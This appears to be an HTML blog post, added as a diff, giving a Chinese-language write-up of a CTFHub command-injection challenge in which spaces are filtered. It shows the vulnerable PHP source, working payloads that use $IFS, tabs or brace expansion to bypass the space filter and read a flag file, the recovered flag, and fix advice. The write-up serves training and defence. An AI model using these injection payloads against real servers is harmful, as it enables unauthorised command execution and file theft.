@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTFHub 命令注入-过滤空格 Writeup - gz2008的技术博客</title>
+    <style>
+        body { background: #f6f9fc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif; color: #1e293b; line-height: 1.8; padding: 40px 20px; display: flex; justify-content: center; }
+        .container { max-width: 820px; width: 100%; background: #ffffff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05); padding: 40px; }
+        .back-link { display: inline-block; margin-bottom: 20px; color: #3b82f6; text-decoration: none; font-weight: 500; }
+        .back-link:hover { text-decoration: underline; }
+        h1 { font-size: 2rem; color: #0f172a; margin-bottom: 10px; border-bottom: 2px solid #eef2f6; padding-bottom: 15px; }
+        .tags { margin-bottom: 25px; }
+        .tag { display: inline-block; background: #eff6ff; color: #2563eb; padding: 4px 12px; border-radius: 20px; font-size: 0.85rem; margin-right: 8px; font-weight: 500; }
+        h2 { font-size: 1.4rem; color: #1e293b; margin-top: 30px; margin-bottom: 15px; border-left: 4px solid #3b82f6; padding-left: 10px; }
+        p { margin-bottom: 15px; color: #475569; }
+        ul, ol { margin-left: 20px; margin-bottom: 15px; color: #475569; }
+        li { margin-bottom: 8px; }
+        code { background: #f1f5f9; padding: 2px 6px; border-radius: 4px; font-family: Consolas, monospace; color: #e11d48; font-size: 0.9em; word-break: break-all; }
+        pre { background: #1e293b; color: #e2e8f0; padding: 15px; border-radius: 8px; overflow-x: auto; font-family: Consolas, monospace; font-size: 0.9em; white-space: pre-wrap; word-break: break-all; }
+        .flag-box { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; padding: 15px; border-radius: 10px; font-weight: 700; font-size: 1.1rem; text-align: center; font-family: Consolas, monospace; margin: 20px 0; word-break: break-all; }
+        .note { background: #fff7ed; border-left: 4px solid #f97316; padding: 12px 16px; border-radius: 6px; color: #9a3412; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="index.html" class="back-link">&larr; 返回 CTFHub 首页</a>
+
+        <h1>CTFHub - Web - 命令注入-过滤空格</h1>
+
+        <div class="tags">
+            <span class="tag"># CTFHub</span>
+            <span class="tag"># Web</span>
+            <span class="tag"># RCE</span>
+            <span class="tag"># 命令注入</span>
+            <span class="tag"># 空格绕过</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>命令注入-过滤空格</li>
+            <li><strong>题目方向：</strong>Web - RCE</li>
+            <li><strong>运行环境：</strong>PHP + Linux</li>
+            <li><strong>题目目标：</strong>在不提交普通空格的情况下执行带参数命令，读取动态 Flag 文件。</li>
+        </ul>
+
+        <h2>二、漏洞分析</h2>
+        <p>页面源码显示，用户输入的 <code>ip</code> 被直接拼接到 <code>ping</code> 命令中。服务端只通过正则拒绝普通空格字符：</p>
+        <pre>&lt;?php
+$ip = $_GET['ip'];
+$m = [];
+
+if (!preg_match_all("/ /", $ip, $m)) {
+    $cmd = "ping -c 4 {$ip}";
+    exec($cmd, $res);
+} else {
+    $res = $m;
+}
+?&gt;</pre>
+        <p>过滤并不完整：命令分隔符 <code>;</code>、<code>&amp;&amp;</code>、<code>|</code> 仍可用；同时 Linux Shell 会在解析阶段将未加引号的 <code>$IFS</code> 展开为字段分隔符，因此可以用它替代命令参数之间的空格。</p>
+        <p class="note">其他可行方式还包括 Tab（URL 编码为 <code>%09</code>）和花括号扩展，例如 <code>{cat,/flag}</code>。本题使用 <code>$IFS</code>，因为它清晰且不依赖具体 Shell 的扩展细节。</p>
+
+        <h2>三、解题步骤</h2>
+        <ol>
+            <li>
+                <strong>验证命令注入并查看根目录：</strong>
+                <p>输入以下载荷，其中 <code>$IFS</code> 会被替换为空格，使 <code>ls</code> 获得根目录参数。</p>
+                <pre>127.0.0.1;ls$IFS/</pre>
+                <p>对应 URL：</p>
+                <pre>http://&lt;challenge-host&gt;:10800/?ip=127.0.0.1%3Bls%24IFS%2F</pre>
+            </li>
+            <li>
+                <strong>定位动态 Flag 文件：</strong>
+                <pre>127.0.0.1;find$IFS/$IFS-name$IFS*flag*</pre>
+                <p>响应中找到本环境的随机文件名：</p>
+                <pre>/var/www/html/flag_26675793315701.php</pre>
+            </li>
+            <li>
+                <strong>使用 cat 和 $IFS 读取文件：</strong>
+                <pre>127.0.0.1;cat$IFS/var/www/html/flag_26675793315701.php</pre>
+                <p>命令输出被 <code>exec()</code> 收集并通过 <code>print_r()</code> 回显：</p>
+                <pre>&lt;?php // ctfhub{8c4312611766ea95e61e3201}</pre>
+                <p>Flag 文件名为环境动态生成，实际复现时应使用目录枚举结果替换上述路径。</p>
+            </li>
+        </ol>
+
+        <h2>四、最终 Flag</h2>
+        <div class="flag-box">ctfhub{8c4312611766ea95e61e3201}</div>
+
+        <h2>五、修复建议</h2>
+        <ul>
+            <li><strong>严格校验输入：</strong>使用 <code>filter_var($ip, FILTER_VALIDATE_IP)</code> 校验目标地址，并拒绝命令分隔符、通配符和变量展开语法。</li>
+            <li><strong>不要拼接 Shell 命令：</strong>避免将用户输入直接传入 <code>exec()</code>；使用参数分离的安全 API，或对每个参数调用 <code>escapeshellarg()</code>。</li>
+            <li><strong>不要依赖单个字符黑名单：</strong>普通空格可由 <code>$IFS</code>、Tab 或其他 Shell 语法替代，过滤必须采用严格白名单。</li>
+            <li><strong>最小化权限：</strong>降低 Web 服务账户权限，并将 Flag 等敏感文件移出 Web 根目录及可读范围。</li>
+        </ul>
+    </div>
+</body>
+</html>
